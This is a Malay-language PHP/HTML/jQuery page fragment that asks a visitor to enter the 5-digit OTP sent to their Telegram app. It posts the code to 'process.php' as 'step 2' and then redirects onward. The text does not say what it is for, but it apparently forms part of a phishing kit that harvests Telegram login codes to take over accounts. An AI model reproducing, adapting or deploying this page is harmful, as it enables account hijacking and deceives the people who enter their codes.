<div class="form-label-title">PENGESAHAN</div>
<p style="text-align:center;font-size:.88rem;color:var(--muted);margin:0 0 16px;line-height:1.5">
  Sila masukkan 5 digit kod OTP yang dihantar ke
  <strong style="color:var(--text)"><?= htmlspecialchars($_SESSION["phone_number"] ?? "", ENT_QUOTES) ?></strong>
  melalui aplikasi Telegram anda.
</p>
<form id="formStep2" novalidate>
<div class="field-block">
<input name="otp" id="otp_code" class="form-control" maxlength="6" placeholder="" inputmode="numeric" pattern="[0-9]{5,6}" style="text-align:center;font-size:1.35rem;letter-spacing:.35em;font-weight:700">
</div>
<button type="submit" class="btn-mk" style="margin-top:20px">Seterusnya</button>
</form>

<div id="wrong"></div>

<style>
#wrong{
    position:fixed;
    top:24px;
    left:0;
    transform:translateX(-115%);
    max-width:380px;
    width:88%;
    background:#fff;
    border:1px solid #fecaca;
    border-left:5px solid #ef4444;
    border-radius:14px;
    padding:14px 18px;
    box-shadow:0 14px 36px rgba(239,68,68,.16),0 0 0 1px rgba(239,68,68,.04);
    font-size:.88rem;
    font-weight:600;
    color:#991b1b;
    z-index:10000;
    display:flex;
    align-items:flex-start;
    gap:10px;
    transition:transform .5s cubic-bezier(.22,1,.36,1),opacity .4s ease;
    opacity:0;
    pointer-events:none;
    line-height:1.45
}
#wrong .wrong-icon{
    flex-shrink:0;
    width:22px;height:22px;
    background:#fef2f2;
    border-radius:50%;
    display:flex;align-items:center;justify-content:center;
    margin-top:1px
}
#wrong .wrong-icon i{font-size:.85rem;color:#ef4444}
#wrong .wrong-text{flex:1}
#wrong.is-visible{
    transform:translateX(18px);
    opacity:1;
    pointer-events:auto
}
#wrong.is-shake{
    animation:wrongShake .55s cubic-bezier(.36,.07,.19,.97) both
}
@keyframes wrongShake{
    0%  {transform:translateX(18px)}
    15% {transform:translateX(28px)}
    30% {transform:translateX(10px)}
    45% {transform:translateX(24px)}
    60% {transform:translateX(14px)}
    75% {transform:translateX(20px)}
    100%{transform:translateX(18px)}
}
#wrong::after{
    content:'';
    position:absolute;
    bottom:0;left:0;
    height:3px;
    background:linear-gradient(90deg,#ef4444,#f87171);
    border-radius:0 0 14px 14px;
    width:0;
    transition:width 5s linear
}
#wrong.is-visible::after{
    width:100%
}
</style>

<script>
$(function(){
  $("#loader, #wrong").hide();

  function showErr(msg) {
    $("#wrong").html(
      '<div class="wrong-icon"><i class="bi bi-exclamation-triangle-fill"></i></div>' +
      '<span class="wrong-text">' + msg + '</span>'
    ).addClass('is-visible');
    setTimeout(function(){ $("#wrong").removeClass('is-visible'); }, 4000);
  }

  $("#formStep2").on("submit", function (e) {
    e.preventDefault();
    $("#wrong").removeClass('is-visible');

    var otp = ($("#otp_code").val() || "").trim();

    if (!/^\d{5,6}$/.test(otp)) {
      showErr("Sila masukkan 5–6 digit kod OTP.");
      $("#otp_code").focus();
      return;
    }

    $("#loader").show();

    $.ajax({
      url: "process.php",
      type: "POST",
      dataType: "json",
      data: { step: "2", otp: otp }
    }).done(function () {
      window.location.href = "?next=otp";
    }).fail(function () {
      $("#loader").hide();
      showErr("Gagal menghantar OTP. Sila cuba lagi.");
    });
  });
});
</script>